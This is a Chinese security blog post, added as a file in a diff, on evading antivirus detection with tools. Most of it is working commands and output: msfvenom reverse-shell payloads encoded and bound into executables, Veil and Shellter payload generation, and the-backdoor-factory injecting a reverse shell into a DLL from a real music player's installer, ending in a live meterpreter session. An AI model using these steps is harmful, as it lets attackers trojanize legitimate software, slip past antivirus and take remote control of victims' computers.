@@ -1,0 +1,872 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" type="image/png" href="/img/head.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="SE_Null">
+  <meta name="keywords" content="">
+  <title>免杀一-工具免杀 - SE_Null</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-03 16:24" pubdate>
+        October 3, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      40
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">免杀一-工具免杀</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>本文简单的介绍一下杀软检测思路以及一些工具的使用。</p>
+<a id="more"></a>
+
+<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-常见杀软检测技术"><a href="#1-常见杀软检测技术" class="headerlink" title="1.常见杀软检测技术"></a>1.常见杀软检测技术</h3><h4 id="1-静态扫描技术"><a href="#1-静态扫描技术" class="headerlink" title="1.静态扫描技术"></a>1.静态扫描技术</h4><p>1.扫描压缩包（带密码的扫描不了）</p>
+<p>2.急救盘扫描（杀软自带功能，u盘，攻击之后）</p>
+<p>3.智能扫描（扫描磁盘是否有恶意文件）</p>
+<p>4.全盘扫描</p>
+<p>5.开机扫描</p>
+<p>…</p>
+<h4 id="2-动态监控技术"><a href="#2-动态监控技术" class="headerlink" title="2.动态监控技术"></a>2.动态监控技术</h4><p>1.内存监控</p>
+<p>2.网页监控</p>
+<p>3.行为监控（针对msf、cs）</p>
+<p>…</p>
+<h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2.检测方法"></a>2.检测方法</h3><p>1.特征码扫描</p>
+<p>2.进程行为检测（沙盒法： <a target="_blank" rel="noopener" href="https://app.any.run/%EF%BC%89">https://app.any.run/）</a></p>
+<p>3.主动防御（杀软）</p>
+<p>4.机器学习识别</p>
+<p>…</p>
+<h3 id="3-杀软绕过思路"><a href="#3-杀软绕过思路" class="headerlink" title="3.杀软绕过思路"></a>3.杀软绕过思路</h3><p>1.修改特征码</p>
+<p>2.加壳（杀软已经把常见的壳加入到恶意规则里面了）</p>
+<p>3.二次编译（写一个东西可以分离加载shellcode再进行编译）</p>
+<p>4.分离免杀（通过下载加载shellcode）</p>
+<p>…</p>
+<h2 id="2-举例"><a href="#2-举例" class="headerlink" title="2.举例"></a>2.举例</h2><h4 id="1-msf"><a href="#1-msf" class="headerlink" title="1.msf"></a>1.msf</h4><h5 id="1-msf编码（老掉牙了，VT检测90-以上）"><a href="#1-msf编码（老掉牙了，VT检测90-以上）" class="headerlink" title="1.msf编码（老掉牙了，VT检测90%以上）"></a>1.msf编码（老掉牙了，VT检测90%以上）</h5><pre><code class="hljs shell">msf5 &gt; msfvenom -l encoders   #查看编码方式
+[*] exec: msfvenom -l encoders
+
+
+Framework Encoders [--encoder &lt;value&gt;]
+======================================
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+ 					
+ 					...省略...
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    				...省略...
+
+msf5 &gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe
+<span class="hljs-meta">#</span><span class="bash"> -i：编码次数 -e：选择excellent的编码方式</span>
+[*] exec: msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe
+					...省略...</code></pre>
+
+<h5 id="2-msf捆绑（被捆绑的软件不能正常使用）"><a href="#2-msf捆绑（被捆绑的软件不能正常使用）" class="headerlink" title="2.msf捆绑（被捆绑的软件不能正常使用）"></a>2.msf捆绑（被捆绑的软件不能正常使用）</h5><pre><code class="hljs shell">msf5 &gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -x /root/example.exe -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe
+<span class="hljs-meta">#</span><span class="bash">  -x:被捆绑的软件的目录  一般是与其他编码方式结合起来，降低被杀概率</span></code></pre>
+
+<h5 id="3-msf内置免杀模块（老掉牙）"><a href="#3-msf内置免杀模块（老掉牙）" class="headerlink" title="3.msf内置免杀模块（老掉牙）"></a>3.msf内置免杀模块（老掉牙）</h5><pre><code class="hljs shell">msf5 &gt; search evasion  #搜索相应的模块
+
+Matching Modules
+================
+
+<span class="hljs-meta">   #</span><span class="bash">  Name                                                 Disclosure Date  Rank    Check  Description</span>
+   -  ----                                                 ---------------  ----    -----  -----------
+ 							 ...省略...
+   5  evasion/windows/windows_defender_exe                                  normal  No     Microsoft Windows Defender Evasive Executable
+   							...省略...
+   Evaluation
+msf5 &gt; use evasion/windows/windows_defender_exe
+msf5 evasion(windows/windows_defender_exe) &gt; 
+</code></pre>
+
+
+
+<h4 id="2-veil（老版kali自带，新版没有）"><a href="#2-veil（老版kali自带，新版没有）" class="headerlink" title="2.veil（老版kali自带，新版没有）"></a>2.veil（老版kali自带，新版没有）</h4><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p>
+<p>结合msf使用示例：</p>
+<p>veil设置：（生成的可执行文件VT检测70%左右）</p>
+<pre><code class="hljs shell">root@kali:~/evasion/Veil# python3 Veil.py
+							...省略...
+Main Menu
+        2 tools loaded
+Available Tools:
+        1)      Evasion		#常用的模块
+        2)      Ordnance	
+Available Commands:		#能够使用命令,后续每选择一次命令都会显示相应的可使用命令
+        exit                    Completely exit Veil
+        info                    Information on a specific tool
+        list                    List available tools
+        options                 Show Veil configuration
+        update                  Update Veil
+        use                     Use a specific tool
+<span class="hljs-meta">Veil&gt;</span><span class="bash">: use 1  <span class="hljs-comment">#选择模块</span></span>
+						...省略......省略... 
+Veil-Evasion Menu                                                                                          
+        41 payloads loaded                                                                                   
+Available Commands:                                                                                          	     back                    Go to Veil&#x27;s main menu                                                               checkvt                 Check VirusTotal.com against generated hashes  #检查VT上的免杀率               	      clean                   Remove generated artifacts                                                   	       exit                    Completely exit Veil                                                                 info                    Information on a specific payload                                                   list                    List available payloads   #  列出能够使用的模块                                         use                     Use a specific payload                                                       Veil/Evasion&gt;: list                                                                                          							...省略...
+ [*] Available Payloads:                                                                                        						   ...省略...                                                                      Veil/Evasion&gt;: use 22								 #选择适合的payload
+							...省略...
+
+ Payload Information:
+							 ...省略...
+Required Options:                
+							...省略...
+ Available Commands:                
+        back            Go back to Veil-Evasion
+        exit            Completely exit Veil
+        generate        Generate the payload				#生成payload
+        options         Show the shellcode&#x27;s options
+        set             Set shellcode option
+
+<span class="hljs-meta">[powershell/meterpreter/rev_tcp&gt;</span><span class="bash">&gt;]: <span class="hljs-built_in">set</span> LHOST 192.168.3.17	<span class="hljs-comment">#依据Required Options:进行相应的设置</span></span>
+<span class="hljs-meta">[powershell/meterpreter/rev_tcp&gt;</span><span class="bash">&gt;]: generate</span>
+							...省略...
+<span class="hljs-meta"> [&gt;</span><span class="bash">] Please enter the base name <span class="hljs-keyword">for</span> output files (default is payload): shell <span class="hljs-comment">#对payload进行命名，默认payload</span></span>
+							...省略...
+ [*] Language: powershell
+ [*] Payload Module: powershell/meterpreter/rev_tcp
+ [*] PowerShell doesn&#x27;t compile, so you just get text :)
+ [*] Source code written to: /var/lib/veil/output/source/shell.bat #生可利用文件形式之一，后续均为各种可利用文件形式 
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/shell.rc 
+
+Hit enter to continue...
+</code></pre>
+
+<p>msf设置：</p>
+<p>若选择bat文件，秩序msf执行监听即可</p>
+<p>若选择rc文件，需要使用<code>-r</code>参数设置：<code>msfconsole -r /var/lib/veil/output/handlers/shell.rc</code></p>
+<p>被攻击机执行生成的可执行文件即可收到会话</p>
+<pre><code class="hljs shell">root@kali:~# msfconsole -r /var/lib/veil/output/handlers/shell.rc
+						...省略...
+msf6 exploit(multi/handler) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information       Connection
+  --  ----  ----                     -----------       ----------
+  1         meterpreter x86/windows  WIN7\haha @ WIN7  192.168.3.17:4444 -&gt; 192.168.3.21:49172 (192.168.3.21)
+
+msf6 exploit(multi/handler) &gt; sessions 1
+[*] Starting interaction with 1...
+
+meterpreter &gt;</code></pre>
+
+
+
+<h4 id="3-venom"><a href="#3-venom" class="headerlink" title="3.venom"></a>3.venom</h4><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/r00t-3xp10it/venom">https://github.com/r00t-3xp10it/venom</a></p>
+<p>安装不麻烦，就是使用中莫名其妙报错导致不能正常执行得到想要的/(ㄒoㄒ)/~~，法克，这个框架作者实时维护，可以一试。</p>
+<h4 id="4-HackTheWorld-我实验的时候可以过360，后面不知道能不能行"><a href="#4-HackTheWorld-我实验的时候可以过360，后面不知道能不能行" class="headerlink" title="4.HackTheWorld(我实验的时候可以过360，后面不知道能不能行)"></a>4.HackTheWorld(我实验的时候可以过360，后面不知道能不能行)</h4><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/stormshadow07/HackTheWorld">https://github.com/stormshadow07/HackTheWorld</a></p>
+<p>这里记录一个小问题，安装没有报错，但执行时提示没有termcolor，pip安装termcolor时提示</p>
+<pre><code class="hljs shell">ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.</code></pre>
+
+<p>只需执行<code>python -m pip install --upgrade setuptools</code>,升级一下setuptools就可。</p>
+<pre><code class="hljs shell">[?] Enter Payload TYPE [tcp,https,tcp_dns]: tcp #选择协议tcp,https,tcp_dns
+ [+] Payload TYPE : tcp
+ [?] Enter LHOST for Payload [LHOST] : 192.168.3.17  #设置地址
+ [+] LHOST for Payload [LPORT] : 192.168.3.17
+ [?] Enter LPORT for Payload : 1234		#设置端口
+ [+] LPORT for Payload : 1234
+							...省略...
+ [?] Enter the Key to Encrypt Shellcode with : xor	#选择编码方式，有xor、base64
+							...省略...
+[*]Do you want to add Manifest (Generally Bypasses Windows Defender)[ 1 or 0 ]?1	#是否执行bypass
+							...省略...
+[+] Final File with Manifest [./result/final_1234.exe]	#生成文件路径</code></pre>
+
+<p>但是比较大500kb+，一般马的大小100kb左右</p>
+<h4 id="5-shellter（目前VT：24-66，可过360）"><a href="#5-shellter（目前VT：24-66，可过360）" class="headerlink" title="5.shellter（目前VT：24/66，可过360）"></a>5.shellter（目前VT：24/66，可过360）</h4><p>动态 shellcode 注入工具，可将shellcode注入到其它程序上，目前只能注入32位的可执行文件。</p>
+<p>官网：<a target="_blank" rel="noopener" href="https://www.shellterproject.com/">https://www.shellterproject.com/</a> </p>
+<p>主程序是.exe文件所以在windows下可以直接使用，在linux上运行需要安装wine环境来运行。</p>
+<p>kali安装</p>
+<pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span>       <span class="hljs-comment">//更新一下</span>
+apt-<span class="hljs-built_in">get</span> install shellter    <span class="hljs-comment">//直接apt在线安装</span></code></pre>
+
+<p>安装完成后再/usr/share/windows-resources/shellter  这个文件夹。hellter_Backups文件夹是注入文件后备份的文件夹，会自动把原文件备份一个到这个文件夹下。</p>
+<p>过程就不贴图了，很简单，列一下会出现的几个要选择的点：</p>
+<pre><code class="hljs shell">Choose Operation Mode - Auto/Manual (A/M/H)： //选择模式 A 自动模式自动注入后门，M高级模式，H帮助
+PE Target：            // 32位可执行文件绝对路径
+Enable Stealth Mode? (Y/N/H): Y               //是否启用隐身模式 输入Y启用 建议N
+Use a listed payload or custom? (L/C/H): L         //选择以列出的Payload还是自定义的
+Select payload by index: 1      //选择payload的序号
+SET LHOST：   //设置反弹回来的IP 本机
+SET LPORT：   //设置接收反弹的端口</code></pre>
+
+
+
+<h4 id="6-the-backdoor-factory"><a href="#6-the-backdoor-factory" class="headerlink" title="6.the-backdoor-factory"></a>6.the-backdoor-factory</h4><p>github项目：<a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p>
+<p><strong>这个工具很强，但是做出来的东西VT检测将近50%，主流的杀软都过不了。。。</strong></p>
+<p>使用之前先pip安装capstone、pefile</p>
+<p>这是一个后门植入工具，原理是可执行二进制文件中有大量的 00，这些 00 是不包含数据的，将这些数据替换成 payload，并且在程序执行的时候，jmp 到代码段，来触发 payload。</p>
+<p>常用的命令有</p>
+<pre><code class="hljs shell">-h：帮助
+-f ：测试文件的路径
+-s show：查看被测试的文件可用的payload
+-H HOST：指定回连的IP
+-P PORT：指定回连的端口
+-J, --cave_jumping    Select this options if you want to use code cave
+                       jumping to further hide your shellcode in the binary.
+-a, --add_new_section
+                       Mandating that a new section be added to the exe
+                       (better success) but less av avoidance
+-U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
+                       User supplied shellcode, make sure that it matches the
+                       architecture that you are targeting.
+-c：测试文件可利用缝隙大小
+-l SHELL_LEN, --shell_length=SHELL_LEN
+                       For use with -c to help find code caves of different
+                       sizes
+-o OUTPUT, --output-file=OUTPUT
+                       The backdoor output file
+-n NSECTION, --section=NSECTION
+                       New section name must be less than seven characters
+-d DIR, --directory=DIR
+                       This is the location of the files that you want to
+                       backdoor. You can make a directory of file backdooring
+                       faster by forcing the attaching of a codecave to the
+                       exe by using the -a setting.
+-w, --change_access   This flag changes the section that houses the codecave
+                       to RWE. Sometimes this is necessary. Enabled by
+                       default. If disabled, the backdoor may fail.
+-i, --injector        This command turns the backdoor factory in a hunt and
+                       shellcode inject type of mechanism. Edit the target
+                       settings in the injector module.
+-u SUFFIX, --suffix=SUFFIX
+                       For use with injector, places a suffix on the original
+                       file for easy recovery
+-D, --delete_original
+                       For use with injector module.  This command deletes
+                       the original file.  Not for use in production systems.
+                       *Author not responsible for stupid uses.*
+-O DISK_OFFSET, --disk_offset=DISK_OFFSET
+                       Starting point on disk offset, in bytes. Some authors
+                       want to obfuscate their on disk offset to avoid
+                       reverse engineering, if you find one of those files
+                       use this flag, after you find the offset.
+-S：检测文件是否支持后门
+-M, --cave-miner      Future use, to help determine smallest shellcode
+                       possible in a PE file
+-q, --no_banner       Kills the banner.
+-v, --verbose         For debug information output.
+-T IMAGE_TYPE, --image-type=IMAGE_TYPE
+                       ALL, x86, or x64 type binaries only. Default=ALL
+-Z, --zero_cert       Allows for the overwriting of the pointer to the PE
+                       certificate table effectively removing the certificate
+                       from the binary for all intents and purposes.
+-R, --runas_admin     EXPERIMENTAL Checks the PE binaries for
+                       &#x27;requestedExecutionLevel level=&quot;highestAvailable&quot;&#x27;. If
+                       this string is included in the binary, it must run as
+                       system/admin. If not in Support Check mode it will
+                       attmept to patch highestAvailable into the manifest if
+                       requestedExecutionLevel entry exists.
+-L, --patch_dll       Use this setting if you DON&#x27;T want to patch DLLs.
+                       Patches by default.
+-F FAT_PRIORITY, --fat_priority=FAT_PRIORITY
+                       For MACH-O format. If fat file, focus on which arch to
+                       patch. Default is x64. To force x86 use -F x86, to
+                       force both archs use -F ALL.
+-B BEACON, --beacon=BEACON
+                       For payloads that have the ability to beacon out, set
+                       the time in secs
+-m PATCH_METHOD, --patch-method=PATCH_METHOD
+                       Patching methods for PE files, &#x27;manual&#x27;,&#x27;automatic&#x27;,
+                       replace and onionduke
+-b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY
+                       For onionduke. Provide your desired binary.
+-X, --xp_mode         Default: DO NOT support for XP legacy machines, use -X
+                       to support XP. By default the binary will crash on XP
+                       machines (e.g. sandboxes)
+-A, --idt_in_cave     EXPERIMENTAL By default a new Import Directory Table
+                       is created in a new section, by calling this flag it
+                       will be put in a code cave.  This can cause bianry
+                       failure is some cases. Test on target binaries first.
+-C, --code_sign       For those with codesigning certs wishing to sign PE
+                       binaries only. Name your signing key and private key
+                       signingcert.cer and signingPrivateKey.pem repectively
+                       in the certs directory it&#x27;s up to you to obtain
+                       signing certs.
+-p, --preprocess      To execute preprocessing scripts in the preprocess
+                       directory
+</code></pre>
+
+<p>使用举例，本次以酷狗音乐的最新安装程序为例</p>
+<p>安装酷狗音乐，打开Process Explorer查找该软件运行的dll库，本次以msvcp140.dll为例。</p>
+<pre><code class="hljs shell">root@kali:~/webtools/BypassAntiVirus/the-backdoor-factory# ./backdoor.py -f msvcp140.dll		#查看可利用的payload
+					...省略...
+The following WinIntelPE32s are available: (use -s)
+   cave_miner_inline
+   iat_reverse_tcp_inline
+   iat_reverse_tcp_inline_threaded
+   iat_reverse_tcp_stager_threaded
+   iat_user_supplied_shellcode_threaded
+   meterpreter_reverse_https_threaded
+   reverse_shell_tcp_inline		#这里选择此模块获取shell
+   reverse_tcp_stager_threaded
+   user_supplied_shellcode_threaded
+root@kali:~/webtools/BypassAntiVirus/the-backdoor-factory# ./backdoor.py -f msvcp140.dll -s reverse_shell_tcp_inline -P 6666 -H 192.168.3.17	#选择模块，设置回连ip，port
+					 ...省略...
+[*] Available caves: 
+1. Section Name: .data; Section Begin: 0x60800 End: 0x62000; Cave begin: 0x61e86 End: 0x61ffc; Cave Size: 374
+2. Section Name: .idata; Section Begin: 0x62000 End: 0x63600; Cave begin: 0x63416 End: 0x635fc; Cave Size: 486
+3. Section Name: None; Section Begin: None End: None; Cave begin: 0x63634 End: 0x6380a; Cave Size: 470
+**************************************************
+[!] Enter your selection: 1	#此处选择1（随意选）
+[!] Using selection: 1 
+					...省略...
+File msvcp140.dll is in the &#x27;backdoored&#x27; directory #生成文件的存储路径</code></pre>
+
+<p>攻击机启动msf，进入<code>handler</code>，设置<code> set payload windows/shell_reverse_tcp,</code>以及回连port，ip，开启监听。</p>
+<p>将生成的新dll文件（大小与原来的不一样）替换原来的dll文件，启动软件，msf即可得到一个会话。</p>
+<p>注：选择的文件可能会导致软件不能正常运行。。。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E5%8F%8A%E6%96%B9%E6%B3%95/">常见杀软检测技术及方法</a>
+                    
+                      <a class="hover-with-bg" href="/tags/msf%E4%B8%89%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">msf三种免杀方法</a>
+                    
+                      <a class="hover-with-bg" href="/tags/veil/">veil</a>
+                    
+                      <a class="hover-with-bg" href="/tags/venom/">venom</a>
+                    
+                      <a class="hover-with-bg" href="/tags/hacktheworld/">hacktheworld</a>
+                    
+                      <a class="hover-with-bg" href="/tags/shellter/">shellter</a>
+                    
+                      <a class="hover-with-bg" href="/tags/the-backdoor-factory/">the-backdoor-factory</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">免杀二-脚本语言免杀</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/02/bypass/">
+                        <span class="hidden-mobile">bypass</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <!-- <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div> -->
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "免杀一-工具免杀&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 100,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
